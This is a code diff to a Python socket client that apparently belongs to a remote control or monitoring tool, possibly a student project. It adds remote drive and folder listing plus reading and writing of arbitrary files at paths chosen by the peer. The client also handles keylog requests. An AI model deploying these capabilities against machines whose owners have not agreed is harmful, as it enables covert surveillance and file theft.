@@ -105,6 +105,7 @@ class Client:
         self.start_time = time()
         self.count = 0
         self.have_focus = True
+        self.list_file = None
 
     def _send(self,mes): 
         try:   
@@ -162,9 +163,56 @@ class Client:
             self.handle_file(request)
         elif request['type']=='keylog':
             self.handle_keylog(request)
+        elif request['type']=='query_file':
+            self.handle_query_file(request)
+        elif request['type']=='update_file':
+            self.file_update(request)
+        elif request['type']=='send_file':
+            self.receive_file(request)
+        elif request['type']=='need_file':
+            self.handle_need_file(request)
         # elif 1:
         #     pass
+        
+    def need_file(self,path1,path2):
+        mes = {
+            'type' : 'need_file',
+            'path1' : path1,
+            'path2' : path2
+        }
+        self._send(mes)
+        
+    def handle_need_file(self,mes):
+        self.send_file(mes['path1'],mes['path2'])
 
+    def send_file(self,path1,path2):
+        file_name = os.path.basename(path1)
+        path2 = os.path.join(path2,file_name)
+        with open(path1,'rb') as file:
+            data = file.read()
+            mes = {
+                'type' : 'send_file',
+                'data' : data,
+                'path' : path2
+            }
+            # print(mes)
+            self._send(mes)
+            
+    def receive_file(self,message):
+        with open(message['path'],'wb') as file:
+            file.write(message['data'])
+        
+    
+    def query_file(self,path):
+        mes = {
+            'type' : 'query_file',
+            'path' : path
+        }
+        self._send(mes)
+    
+    def file_update(self,mes):
+        self.list_file  = mes['files']
+    
     def handle_pass(self,request):
         # print(request['status'])
         self.accepted = request['status']
@@ -189,6 +237,62 @@ class Client:
             'event' : 'on'
         }
         self._send(mes)
+    
+    def handle_query_file(self,mes):
+        self.update_file(mes['path'])
+    
+    def update_file(self,path):
+        if path == '':
+            import ctypes
+            import string
+
+            # Lấy bitmask của các ổ đĩa
+            bitmask = ctypes.windll.kernel32.GetLogicalDrives()
+
+            # Tạo danh sách các ổ đĩa
+            drives = list()
+            for letter in string.ascii_uppercase:
+                if bitmask & 1:
+                    drives.append(letter + ":\\")
+                bitmask >>= 1
+                
+            list_file = []
+            for drive in drives:
+                mes = {
+                    'path' : drive,
+                    'type' : 'folder',
+                    'name' : drive[0]+':'
+                }
+                list_file.append(mes)
+            mes = {
+                'type' : 'update_file',
+                'files' : list_file
+            }
+            self._send(mes)
+            return
+        
+        list_file = []
+        try:
+            entries = os.listdir(path)
+            for entry in entries:
+                full_path = os.path.join(path, entry)
+                file = {
+                    'name' : entry,
+                    'path' : full_path,
+                }
+                if os.path.isfile(full_path):
+                    file['type'] = 'file'
+                elif os.path.isdir(full_path):
+                    file['type'] = 'folder'
+                list_file.append(file)
+        except:
+            pass
+        finally:
+            mes = {
+                'type' : 'update_file',
+                'files' : list_file
+            }
+            self._send(mes)
         
     def off_keyboard(self):
         mes = {
